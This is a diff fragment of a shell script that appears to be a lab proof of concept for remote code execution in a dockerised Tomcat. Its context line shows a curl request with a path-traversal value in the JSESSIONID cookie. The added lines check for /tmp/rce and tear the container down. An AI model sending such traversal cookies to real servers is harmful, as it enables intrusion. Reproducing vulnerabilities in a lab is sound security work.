@@ -10,5 +10,8 @@ curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr
 
 #Vérification de la création de /tmp/rce 
 var=$(docker container ls -q --filter "ancestor=tomcat:groovy")
-echo "\n"
+echo "\n\nFile created :"
 docker exec -t -i $var /bin/ls "/tmp/rce"
+echo "\nCleaning container"
+docker kill $var
+docker rm  $var
